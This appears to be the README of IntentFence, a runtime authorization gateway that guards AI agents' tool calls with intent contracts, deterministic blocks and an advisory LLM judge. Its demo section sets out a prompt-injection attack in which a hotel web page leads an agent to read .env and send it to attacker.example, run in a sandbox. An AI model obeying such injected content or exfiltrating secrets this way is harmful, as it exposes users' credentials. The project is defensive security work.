# IntentFence

**Runtime authorization for autonomous AI agents.** IntentFence converts a user's delegated objective into a typed Intent Contract and places a fail-closed authorization boundary in front of protected agent actions.

Phase 1 establishes the contracts, API boundary, persistence primitives, dashboard shell, and CI gates required before deterministic production policy is enabled. Phase 5 adds a model-independent semantic intent layer for ambiguous actions without giving an LLM root authorization authority. Phase 6 assembles the protected-tool interception gateway, Action Receipts, benchmark-ready security events, and the controlled before/after hotel attack demo.

## Security invariants

- Intent may narrow authority; it never expands it.
- External content cannot grant authority.
- Data may influence reasoning; data cannot grant authority.
- Deterministic hard blocks remain authoritative and cannot be overridden by semantic or cloud models.
- Protected tools execute only through the IntentFence gateway when protection is enabled.
- Semantic timeout, malformed output, low confidence without escalation, or provider failure fail closed to `REQUIRE_APPROVAL`.
- Sensitive gateway paths fail closed when a required security component is unavailable.
- Raw chain-of-thought, raw provider output, raw tool payloads, and secret-bearing request values are not part of receipts or analytics events.

## Phase 1 security guarantees

- Every shared security object is validated with strict Pydantic models.
- Unknown contract fields are rejected.
- Contract versions must be at least 1.
- Risk, confidence, and drift scores are constrained to `[0, 1]`.
- `/authorize` blocks session mismatches, intent mismatches, and expired Intent Contracts.
- External content is represented as source context, not authorization authority.
- Action Receipts and SecurityContext state can be persisted through SQLite.
- The boundary fails closed while Phase 2 policy is absent.

> The Phase 1 placeholder authorizer intentionally never returns production `ALLOW`. Deterministic production authorization belongs to the policy layer; the Phase 5 semantic layer is advisory and does not replace it.

## Phase 5 semantic intent layer

Phase 5 provides:

- strict `SemanticEvaluation` results with `ALLOW`, `BLOCK`, or `REQUIRE_APPROVAL` recommendations;
- compact semantic context containing the active objective, authorization boundaries, action metadata, state indicators, and data labels without arbitrary full history or raw secret-bearing values;
- a structured semantic judge that validates provider JSON and fails closed on timeout, malformed output, or provider errors;
- an Ollama adapter for local inference;
- optional local-to-cloud semantic escalation through an injected cloud judge;
- a high-risk escalation guard so cloud semantic alignment cannot convert high-risk approval state into `ALLOW`;
- a versioned Intent Contract compiler and revision path;
- a stable operator-facing semantic summary containing only the decision hint, reason, relevance, confidence, source, model, latency, and escalation state.

## Phase 6 interception gateway

Phase 6 exposes exactly five protected core tools:

- `browse_web`
- `read_file`
- `write_file`
- `send_message`
- `http_request`

The gateway normalizes every protected request into the shared `ToolRequest` contract, enriches it with resource and destination metadata, composes deterministic/state/data-flow and optional semantic signals, executes the handler only after `ALLOW`, and emits both an `ActionReceipt` and metadata-only `SecurityEvent`.

Decision precedence is intentionally conservative:

1. deterministic or state/data-flow hard `BLOCK`;
2. any other deterministic/state `BLOCK`;
3. deterministic/state `REQUIRE_APPROVAL`;
4. semantic decision only after deterministic layers allow;
5. final `ALLOW` only after the relevant checks clear.

A semantic `ALLOW` cannot override a hard block or approval requirement.

Until the dedicated Phase 2, Phase 3, and Phase 4 adapters are merged, Phase 6 uses `BaselineSecurityAdapter` as a conservative integration fallback. It blocks forbidden secret access, critical data to unknown external destinations, and secret-read to external-transmission sequences. The gateway exposes narrow adapter protocols so final teammate implementations can replace the fallback without changing tool or receipt contracts.

### Golden hotel attack

`POST /demo/hotel-attack` runs one immutable scenario twice with the same protected-tool sequence:

```text
browse_web(hotel-a)
browse_web(hotel-b with hidden injection)
read_file(.env)
http_request(attacker.example)
write_file(workspace/hotel-choice.txt)
```

With `IntentFence` disabled, the controlled secret-read and exfiltration handlers are reached. With `IntentFence` enabled, the malicious path is stopped before the protected handler executes, while the legitimate hotel comparison still reaches the final safe write.

The demo stores only data references such as `data-secret`. It does not place a real credential in the scenario, receipt, event, or API response.

### Sandboxed protected runtime

The HTTP API uses `SandboxProtectedToolRuntime` for CI and hackathon demonstrations. It implements the five protected tool surfaces without performing real network, messaging, or filesystem side effects. Real integrations can replace injected handlers behind the same `IntentFenceGateway.intercept(...)` boundary.

## Local semantic model

Ollama is optional and is **not required by CI**. The local adapter can be configured with these environment variables:

```text
INTENTFENCE_SEMANTIC_OLLAMA_BASE_URL=http://localhost:11434
INTENTFENCE_SEMANTIC_OLLAMA_MODEL=qwen2.5:7b
INTENTFENCE_SEMANTIC_TIMEOUT_SECONDS=5
```

The same defaults are included in `.env.example`. Runtime wiring can load them through the typed application settings:

```python
from intentfence_api.config import get_settings
from intentfence_api.semantic import OllamaProvider, StructuredSemanticJudge

provider = OllamaProvider.from_settings(get_settings())
judge = StructuredSemanticJudge(provider)
```

Direct constructor configuration remains available for tests and deployment-specific overrides:

```python
provider = OllamaProvider(
    base_url="http://localhost:11434",
    model="qwen2.5:7b",
    timeout_seconds=5.0,
)
```

Tests use `httpx.MockTransport`; they never contact a live model server. A cloud provider is also optional. `HybridSemanticJudge` accepts an injected cloud judge and escalates only when local confidence is below the configured threshold.

## Versioned Intent Contracts

`IntentContractDraft` accepts only user-authorized contract fields. Unknown fields, including external-content instructions, are rejected. Compiling a draft produces contract version 1. Revising a contract:

- preserves the session ID;
- creates a new intent ID;
- increments `contract_version`;
- links `previous_intent_id` to the prior contract;
- replaces authority with the newly delegated boundaries rather than inheriting authority from external content.

## Security analytics contract

Phase 6 security events are designed to feed Phase 7 explainability and Phase 8 metrics without raw sensitive payloads. Reproducible event definitions, KPI formulas, ground-truth joins, disabled-demo exclusions, and latency guardrails are documented in `docs/phase-6-analytics-contract.md`.

## Repository structure

```text
apps/
  api/          FastAPI authorization, semantic, and gateway runtime
  dashboard/    Next.js dashboard foundation
packages/
  contracts/    Shared typed security contracts
docs/
  phase-6-analytics-contract.md
  superpowers/  Approved architecture and execution plans
```

## Prerequisites

- Python 3.12
- Node.js 20+
- npm

## Backend setup

```bash
python -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -e ./packages/contracts -e "./apps/api[dev]"
cp .env.example .env
uvicorn intentfence_api.app:app --app-dir apps/api/src --reload --port 8000
```

Windows PowerShell activation:

```powershell
.venv\Scripts\Activate.ps1
```

Health check:

```bash
curl http://127.0.0.1:8000/health
```

Expected response:

```json
{"status":"ok","service":"intentfence-api"}
```

Run the controlled hotel comparison demo:

```bash
curl -X POST http://127.0.0.1:8000/demo/hotel-attack
```

## Dashboard setup

```bash
npm --prefix apps/dashboard install
npm --prefix apps/dashboard run dev
```

By default the dashboard probes `http://localhost:8000/health`. Override it with `NEXT_PUBLIC_API_BASE_URL` when needed.

## Verification

Run the same gates used by CI:

```bash
python -m ruff check packages/contracts apps/api
python -m pytest packages/contracts/tests apps/api/tests -q
npm --prefix apps/dashboard run lint
npm --prefix apps/dashboard run typecheck
npm --prefix apps/dashboard run build
```

Phase 6 focused tests:

```bash
python -m pytest apps/api/tests/test_gateway_models.py \
  apps/api/tests/test_gateway_tools.py \
  apps/api/tests/test_gateway_precedence.py \
  apps/api/tests/test_gateway_baseline.py \
  apps/api/tests/test_gateway_service.py \
  apps/api/tests/test_gateway_demo.py \
  apps/api/tests/test_gateway_api.py -q
```

Semantic tests cover compact context, strict result validation, timeout/malformed/provider failure handling, Ollama request/response behavior, typed environment configuration, hybrid escalation, high-risk approval preservation, contract versioning, and operator-facing summaries.

## API surface

### `GET /health`

Returns the fixed service health payload.

### `POST /authorize`

Accepts:

- `ToolRequest`
- `IntentContract`
- `SecurityContext`

Returns the Phase 1 typed fail-closed `Decision`. This endpoint is preserved for regression compatibility while Phase 6 integration occurs through the dedicated gateway surface.

### `POST /gateway/intercept`

Accepts:

- `ToolRequest`
- `IntentContract`
- `SecurityContext`
- optional `DataLabel[]`
- `GatewayMode`
- optional `scenario_id`

Returns `GatewayExecution`, which includes the final decision, execution state, sanitized result metadata, `ActionReceipt`, and `SecurityEvent`.

### `POST /demo/hotel-attack`

Runs the shared golden attack once with protection disabled and once with protection enabled. The response exposes matching tool sequences, decisions, receipt IDs, events, whether the malicious handlers executed, and whether the legitimate workflow completed.

## Shared contracts

The shared contract package exports:

- `IntentContract`
- `ToolRequest`
- `DataLabel`
- `SecurityContext`
- `Decision`
- `ActionReceipt`

These interfaces are the stable boundary consumed by policy, state, data-flow, semantic, gateway, benchmark, and console phases.

## Branch convention

Feature work:

```text
<github-user>/phase-<n>-feat-<slug>
```

Bug fixes:

```text
<github-user>/phase-<n>-bug-<slug>
```

Example:

```text
rajeet/phase-6-feat-gateway
```

## Development rule

Security implementation is merged serially through reviewed pull requests. Parallel phase work may expose stable interfaces, but final authorization precedence is integrated only after its dependency phases are available and the full CI gate is green.
